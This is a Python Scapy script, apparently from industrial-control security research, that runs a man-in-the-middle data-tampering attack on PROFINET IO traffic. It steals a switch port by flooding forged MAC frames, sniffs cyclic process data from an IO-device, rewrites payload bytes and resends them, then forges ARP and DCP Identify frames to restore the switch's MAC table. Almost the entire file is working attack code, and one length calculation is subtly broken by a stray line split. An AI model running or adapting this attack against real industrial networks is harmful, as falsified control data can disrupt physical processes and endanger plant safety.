from email import message
from scapy.all import *
import time

# from profinet_controller.protocol_machines.cpm.messages.pnio_ps import *
import scapy.all as scapy
from scapy.contrib.pnio import *
from scapy.contrib.pnio_dcp import *
from helper.pnio_ps import parse_data_message, PNIOPSMessage, get_data_msg
from helper.gsdml_parser import XMLDevice


scapy.load_contrib("pnio_dcp")
scapy.load_contrib("pnio")

# ---------------------------------------------------------------
# DESCRIPTION
# We want to forge the DCP-Communication between IO-Device and
# IO-Controller to forge the IP and NameOfStation Attributes
# of the DCP-Messages to manipulate the network parameters
# of the IO-Device.
# ---------------------------------------------------------------

# it is important for the mitm attack if name of device is set
# because that is required for reinitializing the Switches mactable
station_name = ""

# IDENT Message is required to reset the MAC-Table in the switch
# to right entries
def get_ident_msg(src, name_of_station):
    ether = scapy.Ether(dst="01:0e:cf:00:00:00", src=src, type=0x8892)
    pnio_msg = ProfinetIO(frameID=DCP_IDENTIFY_REQUEST_FRAME_ID)

    if name_of_station == "":
        dcp_data_length = 0
    else:
        dcp_data_length = len(name_of_station)
        +(5 if len(name_of_station) % 2 == 1 else 4)

    pnio_dcp_ident = ProfinetDCP(
        service_id=DCP_SERVICE_ID_IDENTIFY,
        service_type=DCP_REQUEST,
        xid=0x9A,
        reserved=1,
        dcp_data_length=dcp_data_length,  # if set 0, all devices with no name answer
        option=0x02,
        sub_option=0x02,
        dcp_block_length=len(name_of_station),
        name_of_station=name_of_station,
    )
    return ether / pnio_msg / pnio_dcp_ident


def get_ident_arp_msg(src, destIP):
    return scapy.Ether(src=src, dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=destIP)


# to parse the io data in the right format
def getOutputData(do8, do32, do64):
    return [
        {
            "module_ident": int(0x00000080),
            "submodule_ident": int(0x00000080),
            "values": [int(do8)],
        },
        {
            "module_ident": int(0x00000100),
            "submodule_ident": int(0x00000100),
            "values": list(struct.pack("f", do32)),
        },
        {
            "module_ident": int(0x00000200),
            "submodule_ident": int(0x00000200),
            "values": list(struct.pack("d", do64)),
        },
    ]


# 00:1D:9C:C7:B0:70
# attacker-eth0
def stealPort(macAddress, iface):
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        sendp(
            scapy.Ether(src=macAddress, dst="ff:ff:ff:ff:ff:ff"),
            iface=iface,
            verbose=False,
        )
        time.sleep(0.125)


def forgeMessages(realAddress, srcAddress, destAddress, device, stealThread, iface):
    def update_load(pkt):
        if pkt.haslayer("PROFINET IO Real Time Cyclic Default Raw Data"):
            stealThread.do_run = False
            message_data = parse_data_message(pkt, device)
            do8 = int(message_data.input_data["data"][0][0])
            do32 = struct.unpack("f", bytearray(message_data.input_data["data"][1]))[0]
            do64 = struct.unpack("d", bytearray(message_data.input_data["data"][2]))[0]

            org = pkt["PROFINET IO Real Time Cyclic Default Raw Data"].data
            
            new = org[:4] + b"\x80\x11\x11" + org[7:]
            pkt["PROFINET IO Real Time Cyclic Default Raw Data"].data = new

            reset_msg_controller = get_ident_arp_msg(
                src=realAddress, destIP="192.168.1.10"
            )
            scapy.sendp(reset_msg_controller, iface=iface)
            time.sleep(0.02)
            t = threading.currentThread()
            sendp(
                pkt,
                iface=iface,
                verbose=False,
            )
            time.sleep(0.02)
            reset_device_mac = get_ident_msg(realAddress, "dev1")
            sendp(
                reset_device_mac,
                iface=iface,
                verbose=False,
            )
            time.sleep(0.02)

            t.do_run = False

    def stopFilter(x):
        t = threading.currentThread()
        return not getattr(t, "do_run", True)

    sniff(
        filter=f"ether src {srcAddress} and ether proto 0x8892",
        store=0,
        count=-1,
        prn=update_load,
        iface=iface,
        stop_filter=stopFilter,
    )


device = XMLDevice("./attacks/data_tampering/helper/minicps_device.xml")

steal = threading.Thread(target=stealPort, args=["00:1D:9C:C7:B0:70", "attacker-eth0"])
forge = threading.Thread(
    target=forgeMessages,
    args=[
        "00:1D:9C:C8:BD:18",
        "00:1D:9C:C7:B0:11",
        "00:1D:9C:C7:B0:70",
        device,
        steal,
        "attacker-eth0",
    ],
)

steal.start()
forge.start()
